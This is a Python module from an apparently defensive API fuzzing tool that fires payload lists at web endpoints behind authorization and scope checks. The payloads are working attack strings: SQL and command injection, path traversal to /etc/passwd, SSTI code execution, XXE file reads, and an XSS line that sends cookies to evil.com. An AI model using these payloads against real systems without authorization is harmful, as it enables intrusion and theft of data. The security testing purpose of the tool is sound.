"""
creep_fuzz.py — Phase 2: API Fuzzer
Part of Creep: Defensive Adversarial Security Scanner
Author: Leon Priest
License: Apache 2.0

Active fuzzing module. Takes an endpoint list (from creep_surface or manual)
and fires structured payloads at live services:
  - SQL injection probes
  - NoSQL injection probes
  - Command injection probes
  - Path traversal probes
  - XSS reflection probes
  - SSTI (Server-Side Template Injection) probes
  - XXE probes
  - Oversized / boundary inputs
  - Type confusion payloads
  - JSON structure abuse

REQUIRES EXPLICIT OPT-IN. Every fuzz run is logged with timestamp,
target URL, payload category, and response code. Fail-safe by default —
destructive methods (DELETE, DROP, etc.) are skipped unless force=True.
"""

from __future__ import annotations

import json
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterator

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from creep_static import Category, Finding, Severity
from creep_gate  import check_scope_url, ScopeError

# ---------------------------------------------------------------------------
# Audit log
# ---------------------------------------------------------------------------

_AUDIT_LOG = Path.home() / ".creep" / "fuzz_audit.jsonl"


def _log_fuzz(url: str, method: str, category: str, status: int | None, *, event: str = "result") -> None:
    try:
        _AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
        record = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event":     event,
            "url":       url,
            "method":    method,
            "category":  category,
            "status":    status,
            "module":    "creep_fuzz",
        }
        with open(_AUDIT_LOG, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record) + "\n")
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Payload library
# ---------------------------------------------------------------------------

# ── SQL Injection ────────────────────────────────────────────────────────────
SQL_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "1' AND SLEEP(2)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1' ORDER BY 1--",
    "1' ORDER BY 999--",          # column count probe
    "'; EXEC xp_cmdshell('id')--", # MSSQL RCE probe
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
]

# ── NoSQL Injection ──────────────────────────────────────────────────────────
NOSQL_PAYLOADS: list[str] = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(2000)"}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    "' || '1'=='1",
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

# ── Command Injection ────────────────────────────────────────────────────────
CMD_PAYLOADS: list[str] = [
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; sleep 2",
    "| sleep 2",
    "&& sleep 2",
    "|| sleep 2",
    "; ping -c 1 127.0.0.1",
    "\n/bin/sh -c id\n",
    "%0a id",
    "%0a cat /etc/passwd",
    "$(sleep 2)",
    "`sleep 2`",
]

# ── Path Traversal ───────────────────────────────────────────────────────────
TRAVERSAL_PAYLOADS: list[str] = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "....//etc/passwd",
    "..\\.\\etc\\passwd",
    "..%5Cetc%5Cpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
]

# ── XSS ─────────────────────────────────────────────────────────────────────
XSS_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "{{7*7}}",                       # also SSTI probe
    "${7*7}",
    "<%=7*7%>",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
]

# ── SSTI (Server-Side Template Injection) ────────────────────────────────────
SSTI_PAYLOADS: list[str] = [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%=7*7%>",
    "#{7*7}",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{%import os%}{{os.popen('id').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "*{7*7}",
    "@(7*7)",
]

# ── XXE ──────────────────────────────────────────────────────────────────────
XXE_PAYLOADS: list[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1:11434/api/version">]><test>&xxe;</test>',
]

# ── Boundary / Size inputs ───────────────────────────────────────────────────
BOUNDARY_PAYLOADS: list[str] = [
    "",                              # empty string
    " ",                             # whitespace only
    "null",
    "None",
    "undefined",
    "0",
    "-1",
    "99999999999999999999",          # integer overflow
    "0.0",
    "NaN",
    "Infinity",
    "-Infinity",
    "true",
    "false",
    "[]",
    "{}",
    "A" * 1024,                      # 1 KB string
    "A" * 8192,                      # 8 KB string
    "A" * 65536,                     # 64 KB string
    "\x00",                          # null byte
    "\x00" * 100,
    "\n" * 100,
    "\r\n" * 50,
    "%" * 100,                       # format string bait
    "%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x",
    "{{" * 50,                       # template bomb
]

# ── Type confusion ───────────────────────────────────────────────────────────
TYPE_PAYLOADS: list[dict] = [
    {"value": None},
    {"value": True},
    {"value": False},
    {"value": []},
    {"value": {}},
    {"value": [None, None, None]},
    {"value": {"$type": "evil"}},
    {"value": 0},
    {"value": -1},
    {"value": 2**31},
    {"value": 2**63},
    {"value": float("inf")},         # note: json.dumps will raise — handled
    {"value": "\x00\x01\x02"},
]

# ── JSON structure abuse ─────────────────────────────────────────────────────
JSON_ABUSE: list[str] = [
    "null",
    "true",
    "[]",
    "[" + "[]," * 500 + "[]]",       # deeply nested array
    "{" + '"a":' * 0 + "}",
    '{"__proto__": {"admin": true}}', # prototype pollution
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"a":"' + "x" * 10000 + '"}',   # large value
    '{"a":' + "1," * 999 + '"b":2}', # many keys (invalid JSON test)
]


# ---------------------------------------------------------------------------
# Fuzz result
# ---------------------------------------------------------------------------

@dataclass
class FuzzResult:
    url:          str
    method:       str
    category:     str
    payload:      str
    status:       int | None
    response_len: int
    response_ms:  float
    reflected:    bool = False       # payload found in response body
    error:        str  = ""
    interesting:  bool = False       # flagged for review


# ---------------------------------------------------------------------------
# HTTP session factory
# ---------------------------------------------------------------------------

def _make_session(timeout: float = 5.0) -> requests.Session:
    session = requests.Session()
    adapter = HTTPAdapter(
        max_retries=Retry(total=0),  # no retries — we want real responses
    )
    session.mount("http://",  adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "creep-fuzzer/0.1",
        "Accept":     "*/*",
    })
    return session


# ---------------------------------------------------------------------------
# Payload delivery helpers
# ---------------------------------------------------------------------------

def _safe_json(obj) -> str | None:
    """Serialise to JSON, return None if not serialisable."""
    try:
        return json.dumps(obj)
    except (TypeError, ValueError):
        return None


def _is_interesting(
    result: FuzzResult,
    baseline_status: int | None,
    baseline_len: int,
) -> bool:
    """
    Heuristic: flag a result as interesting if it deviates meaningfully
    from the baseline (unarmed) request.
    """
    if result.error:
        return False
    if result.status is None:
        return False

    # Status code shifts
    if baseline_status and result.status != baseline_status:
        # 200 where we got 403 before → bypass
        # 500 → crash
        # 200→302 → redirect
        if result.status in (200, 302, 500, 502, 503):
            return True

    # Payload reflected in body
    if result.reflected:
        return True

    # Response much larger than baseline → data leak / verbose error
    if baseline_len and result.response_len > baseline_len * 3 and result.response_len > 500:
        return True

    # 500-series on a normally-200 endpoint
    if baseline_status == 200 and result.status and result.status >= 500:
        return True

    return False


def _probe(
    session:     requests.Session,
    url:         str,
    method:      str,
    payload:     str,
    category:    str,
    param_name:  str = "q",
    as_json:     bool = False,
    headers:     dict | None = None,
    timeout:     float = 5.0,
) -> FuzzResult:
    """Send one fuzz probe and return a FuzzResult."""
    t0    = time.monotonic()
    resp  = None
    error = ""
    body  = ""

    # Audit before traffic goes out
    _log_fuzz(url, method, category, status=None, event="attempted")

    try:
        req_headers = headers or {}
        if method.upper() in ("GET", "HEAD", "DELETE"):
            # Inject into URL query string
            sep = "&" if "?" in url else "?"
            probe_url = f"{url}{sep}{urllib.parse.quote(param_name, safe='')}={urllib.parse.quote(payload, safe='')}"
            resp = session.request(
                method.upper(), probe_url,
                headers=req_headers,
                timeout=timeout,
                allow_redirects=False,
                verify=False,
            )
        else:
            # Inject into request body
            if as_json:
                data = _safe_json({param_name: payload})
                if data is None:
                    data = f'{{"{param_name}": null}}'
                req_headers = {**req_headers, "Content-Type": "application/json"}
                resp = session.request(
                    method.upper(), url,
                    data=data,
                    headers=req_headers,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False,
                )
            else:
                resp = session.request(
                    method.upper(), url,
                    data={param_name: payload},
                    headers=req_headers,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False,
                )
        body = resp.text[:4096]
    except requests.exceptions.Timeout:
        error = "timeout"
    except requests.exceptions.ConnectionError as e:
        error = f"connection_error: {str(e)[:80]}"
    except Exception as e:
        error = f"error: {str(e)[:80]}"

    elapsed  = (time.monotonic() - t0) * 1000
    status   = resp.status_code if resp is not None else None
    resp_len = len(body)

    # Check reflection (XSS / SSTI)
    reflected = bool(body and len(payload) > 3 and payload[:20] in body)

    result = FuzzResult(
        url=url, method=method, category=category,
        payload=payload[:100], status=status,
        response_len=resp_len, response_ms=round(elapsed, 1),
        reflected=reflected, error=error,
    )

    _log_fuzz(url, method, category, status, event="result")
    return result


def _baseline(
    session:  requests.Session,
    url:      str,
    method:   str,
    timeout:  float = 5.0,
) -> tuple[int | None, int]:
    """Send an unarmed request to establish a baseline status + response length."""
    _log_fuzz(url, method, "baseline", status=None, event="attempted")
    try:
        resp = session.request(
            method.upper(), url,
            timeout=timeout,
            allow_redirects=False,
            verify=False,
        )
        _log_fuzz(url, method, "baseline", status=resp.status_code, event="result")
        return resp.status_code, len(resp.text)
    except Exception:
        _log_fuzz(url, method, "baseline", status=None, event="result")
        return None, 0


# ---------------------------------------------------------------------------
# Per-endpoint fuzzer
# ---------------------------------------------------------------------------

def fuzz_endpoint(
    url:         str,
    method:      str       = "GET",
    *,
    tier:        str       = "standard",
    categories:  list[str] | None = None,
    param_name:  str   = "q",
    as_json:     bool  = False,
    timeout:     float = 5.0,
    delay:       float = 0.05,
    progress_cb=None,
) -> list[FuzzResult]:
    """
    Fuzz a single endpoint with tiered or explicit payload categories.

    Args:
        url:        Full URL to probe.
        method:     HTTP method (GET/POST/PUT/PATCH).
        tier:       Payload tier: 'safe', 'standard' (default), or 'dangerous'.
                    - safe:      boundary inputs + low-impact JSON structure probes — no injection.
                    - standard:  XSS, SSTI, NoSQL, traversal, SQL, boundary, JSON.
                    - dangerous: all of standard plus cmd injection and XXE.
                    Ignored if categories= is specified.
        categories: Explicit list of categories (overrides tier).
        param_name: Parameter name to inject into.
        as_json:    Send POST body as JSON.
        timeout:    Per-request timeout.
        delay:      Seconds between requests (rate limiting).
        progress_cb: Optional callable(msg: str).

    Returns:
        List of FuzzResult objects for interesting probes.
    """

    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    # Payload lookup (all known categories)
    _ALL_CATEGORIES = {
        "sql":       SQL_PAYLOADS,
        "nosql":     NOSQL_PAYLOADS,
        "cmd":       CMD_PAYLOADS,
        "traversal": TRAVERSAL_PAYLOADS,
        "xss":       XSS_PAYLOADS,
        "ssti":      SSTI_PAYLOADS,
        "boundary":  BOUNDARY_PAYLOADS,
        "json":      JSON_ABUSE,
        "xxe":       XXE_PAYLOADS,
    }

    # ── Tier system ─────────────────────────────────────────────────────
    # categories= list always overrides tier.
    # tier='safe'      → boundary + low-impact JSON structure probes (no injection)
    # tier='standard'  → common probes, no destructive cmd/xxe (default)
    # tier='dangerous' → everything including cmd injection + XXE
    if categories is not None:
        active = {k: v for k, v in _ALL_CATEGORIES.items() if k in categories}
    elif tier == "safe":
        active = {
            "boundary": BOUNDARY_PAYLOADS,
            "json":     JSON_ABUSE,
        }
    elif tier == "dangerous":
        active = {
            "sql":       SQL_PAYLOADS,
            "nosql":     NOSQL_PAYLOADS,
            "cmd":       CMD_PAYLOADS,
            "traversal": TRAVERSAL_PAYLOADS,
            "xss":       XSS_PAYLOADS,
            "ssti":      SSTI_PAYLOADS,
            "boundary":  BOUNDARY_PAYLOADS,
            "json":      JSON_ABUSE,
            "xxe":       XXE_PAYLOADS,
        }
    elif tier == "standard":
        active = {
            "sql":       SQL_PAYLOADS,
            "nosql":     NOSQL_PAYLOADS,
            "traversal": TRAVERSAL_PAYLOADS,
            "xss":       XSS_PAYLOADS,
            "ssti":      SSTI_PAYLOADS,
            "boundary":  BOUNDARY_PAYLOADS,
            "json":      JSON_ABUSE,
        }
    else:
        raise ValueError(f"Unknown fuzz tier: {tier!r}. Use 'safe', 'standard', or 'dangerous'.")

    _log(f"  Tier: {tier} | {len(active)} category/categories")

    session = _make_session(timeout)

    # Baseline
    _log(f"  Baseline: {method} {url}")
    base_status, base_len = _baseline(session, url, method, timeout)
    _log(f"  Baseline → HTTP {base_status} | {base_len} bytes")

    results: list[FuzzResult] = []
    total   = sum(len(v) for v in active.values())
    sent    = 0

    for category, payloads in active.items():
        _log(f"  [{category.upper():<10}] {len(payloads)} payloads")
        for payload in payloads:
            r = _probe(
                session, url, method, payload, category,
                param_name=param_name, as_json=as_json, timeout=timeout,
            )
            sent += 1
            r.interesting = _is_interesting(r, base_status, base_len)

            if r.interesting or r.error:
                sym = "!" if r.interesting else "?"
                _log(
                    f"    [{sym}] {r.status} | {r.response_len}b | "
                    f"{r.response_ms}ms | {r.payload[:40]!r}"
                )
            if r.interesting or r.reflected:
                results.append(r)

            if delay > 0:
                time.sleep(delay)

    _log(f"  Sent {sent} probe(s) → {len(results)} interesting result(s)")
    return results


# ---------------------------------------------------------------------------
# Multi-endpoint fuzzer
# ---------------------------------------------------------------------------

@dataclass
class FuzzTarget:
    url:        str
    method:     str = "GET"
    param_name: str = "q"
    as_json:    bool = False


def fuzz_targets(
    targets:      list[FuzzTarget],
    *,
    tier:         str   = "standard",
    categories:   list[str] | None = None,
    timeout:      float = 5.0,
    delay:        float = 0.05,
    force:        bool  = False,
    authorized:   bool  = False,
    allow_public: bool  = False,
    scope:        dict | None = None,
    progress_cb=None,
) -> tuple[list[FuzzResult], list[Finding]]:
    """
    Fuzz multiple endpoints and return results + findings.

    Args:
        targets:    List of FuzzTarget descriptors.
        tier:       Payload tier: 'safe', 'standard' (default), or 'dangerous'.
                    'dangerous' includes cmd injection, XXE, and file-read probes.
        categories: Explicit category list — overrides tier when specified.
        timeout:    Per-request timeout in seconds.
        delay:      Delay between requests per endpoint.
        force:      If False (default), skip DELETE targets.
        progress_cb: Optional callable(msg: str).

    Returns:
        (all_results, findings)
    """

    def _log(msg: str) -> None:
        if progress_cb:
            progress_cb(msg)

    all_results: list[FuzzResult] = []
    all_findings: list[Finding]   = []

    # ── Scope gate — check each unique host before any requests go out ──
    seen_hosts: set[str] = set()
    for t in targets:
        check_scope_url(t.url, authorized=authorized,
                        allow_public=allow_public, scope=scope, module="fuzz")
        seen_hosts.add(t.url)

    for i, t in enumerate(targets, 1):
        # Safety gate — skip DELETE unless forced
        if t.method.upper() == "DELETE" and not force:
            _log(f"[{i}/{len(targets)}] SKIP (DELETE requires force=True): {t.url}")
            continue

        _log(f"\n[{i}/{len(targets)}] Fuzzing {t.method} {t.url}")

        results = fuzz_endpoint(
            t.url, t.method,
            tier=tier,
            categories=categories,
            param_name=t.param_name,
            as_json=t.as_json,
            timeout=timeout,
            delay=delay,
            progress_cb=progress_cb,
        )
        all_results.extend(results)
        all_findings.extend(_results_to_findings(results, t.url, t.method))

    all_findings.sort(key=lambda f: f.severity.rank)
    return all_results, all_findings


# ---------------------------------------------------------------------------
# Findings generator
# ---------------------------------------------------------------------------

# Category → (severity, title_prefix, detail)
_CATEGORY_MAP: dict[str, tuple[Severity, str, str]] = {
    "sql":       (Severity.CRITICAL, "Possible SQL injection",
                  "Response deviated from baseline when SQL injection payloads were sent. "
                  "Manual verification required to confirm exploitability."),
    "nosql":     (Severity.CRITICAL, "Possible NoSQL injection",
                  "Response deviated when NoSQL operator payloads were sent. "
                  "May allow authentication bypass or data exfiltration."),
    "cmd":       (Severity.CRITICAL, "Possible command injection",
                  "Response deviated when OS command injection payloads were sent. "
                  "If exploitable, allows arbitrary command execution on the host."),
    "traversal": (Severity.HIGH,     "Possible path traversal",
                  "Response deviated when directory traversal payloads were sent. "
                  "May allow reading arbitrary files from the server filesystem."),
    "xss":       (Severity.HIGH,     "Possible XSS / reflection",
                  "Payload was reflected in the response body. "
                  "If unsanitised, cross-site scripting attacks are possible."),
    "ssti":      (Severity.CRITICAL, "Possible SSTI",
                  "Response deviated when server-side template injection payloads were sent. "
                  "If exploitable, allows arbitrary code execution via the template engine."),
    "boundary":  (Severity.MEDIUM,   "Boundary input caused anomaly",
                  "Response deviated when oversized or malformed inputs were sent. "
                  "May indicate missing input validation, crashes, or verbose errors."),
    "json":      (Severity.MEDIUM,   "JSON structure abuse caused anomaly",
                  "Response deviated when JSON structure abuse payloads were sent. "
                  "May indicate prototype pollution, parser crashes, or type confusion."),
    "xxe":       (Severity.CRITICAL, "Possible XXE injection",
                  "Response deviated when XML External Entity payloads were sent. "
                  "If exploitable, allows server-side file read or SSRF."),
}


def _results_to_findings(
    results: list[FuzzResult],
    url:     str,
    method:  str,
) -> list[Finding]:
    findings: list[Finding] = []

    # Group by category
    by_cat: dict[str, list[FuzzResult]] = {}
    for r in results:
        by_cat.setdefault(r.category, []).append(r)

    for cat, cat_results in by_cat.items():
        sev, title_prefix, detail = _CATEGORY_MAP.get(
            cat,
            (Severity.MEDIUM, f"Anomaly ({cat})", "Response deviated from baseline."),
        )

        # Sample up to 3 interesting payloads for evidence
        samples = [r.payload for r in cat_results[:3]]
        status_codes = list({r.status for r in cat_results if r.status})

        # Bump severity for reflection
        reflected = any(r.reflected for r in cat_results)
        if reflected and sev == Severity.HIGH:
            sev = Severity.CRITICAL

        findings.append(Finding(
            severity=sev,
            category=Category.INJECTION,
            target=url,
            title=f"{title_prefix}: {method} {url}",
            detail=detail,
            evidence=(
                f"Payloads: {samples} | "
                f"Status codes seen: {status_codes} | "
                f"Reflected: {reflected}"
            ),
            module="fuzz",
        ))

    return findings


# ---------------------------------------------------------------------------
# Endpoint list builder (from creep_surface output)
# ---------------------------------------------------------------------------

def targets_from_surface(
    endpoints,          # list[Endpoint] from creep_surface
    base_url: str,
    *,
    include_methods: set[str] | None = None,
) -> list[FuzzTarget]:
    """
    Convert a creep_surface endpoint list into FuzzTarget objects.

    Args:
        endpoints:       List of Endpoint objects from creep_surface.run_surface_scan().
        base_url:        Base URL e.g. 'http://localhost:8000'.
        include_methods: Methods to include. Default: GET, POST, PUT, PATCH.
    """
    if include_methods is None:
        include_methods = {"GET", "POST", "PUT", "PATCH"}

    targets = []
    for ep in endpoints:
        method = ep.method.upper()
        if method not in include_methods:
            continue

        # Substitute path params with safe test values
        path = ep.path
        for param in ep.params:
            path = path.replace(f"{{{param}}}", "1")
            path = path.replace(f"<{param}>",   "1")

        url = base_url.rstrip("/") + "/" + path.lstrip("/")
        as_json = method in ("POST", "PUT", "PATCH")

        targets.append(FuzzTarget(
            url=url,
            method=method,
            param_name=ep.params[0] if ep.params else "q",
            as_json=as_json,
        ))

    return targets


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Creep API Fuzzer — direct entry",
        epilog="Only fuzz systems you own or have written permission to test.",
    )
    parser.add_argument("url",        help="Target URL to fuzz")
    parser.add_argument("method",     nargs="?", default="GET", help="HTTP method (default: GET)")
    parser.add_argument("param_name", nargs="?", default="q",   help="Parameter to inject into (default: q)")
    parser.add_argument(
        "--i-am-authorized", dest="authorized", action="store_true", default=False,
        help="Confirm you have explicit authorisation to fuzz this target.",
    )
    parser.add_argument(
        "--allow-public", dest="allow_public", action="store_true", default=False,
        help="Allow fuzzing public IPs (requires --i-am-authorized).",
    )
    parser.add_argument(
        "--tier", choices=["safe", "standard", "dangerous"], default="safe",
        help="Payload tier (default: safe).",
    )
    parser.add_argument(
        "--scope-file", dest="scope_file", default=None, metavar="FILE",
        help="Path to a scope.json file (grants authorisation if 'authorized: true' is set).",
    )
    args = parser.parse_args()

    # Load scope file if provided — it can substitute for --i-am-authorized
    scope = None
    if args.scope_file:
        from creep_gate import load_scope_file, ScopeError as _SE
        try:
            scope = load_scope_file(args.scope_file)
            args.authorized   = args.authorized   or bool(scope.get("authorized",   False))
            args.allow_public = args.allow_public or bool(scope.get("allow_public", False))
        except _SE as e:
            print(f"\n[creep-fuzz] ERROR: {e}\n")
            raise SystemExit(1)

    if not args.authorized:
        print("\n[creep-fuzz] ERROR: Active fuzzing requires explicit authorisation.")
        print("  Add --i-am-authorized or use --scope-file scope.json with 'authorized: true'.")
        print("  Only fuzz systems you own or have written permission to test.\n")
        raise SystemExit(1)

    as_json = args.method.upper() in ("POST", "PUT", "PATCH")

    print(f"\n[creep-fuzz] Target: {args.method} {args.url}")
    print(f"             Param : {args.param_name} | JSON body: {as_json} | Tier: {args.tier}")
    print("=" * 60)
    print("  !! ACTIVE FUZZ — authorisation confirmed !! ")
    print("=" * 60 + "\n")

    results, findings = fuzz_targets(
        [FuzzTarget(url=args.url, method=args.method, param_name=args.param_name, as_json=as_json)],
        authorized=args.authorized,
        allow_public=args.allow_public,
        scope=scope,
        tier=args.tier,
        progress_cb=lambda m: print(f"  {m}"),
    )

    print(f"\n{'─'*60}")
    print(f"  Interesting results : {len(results)}")
    print(f"  Findings generated  : {len(findings)}")
    print(f"{'─'*60}\n")

    for f in findings:
        print(f"[{f.severity.value:<8}] {f.title}")
        print(f"           Detail  : {f.detail}")
        print(f"           Evidence: {f.evidence}")
        print()
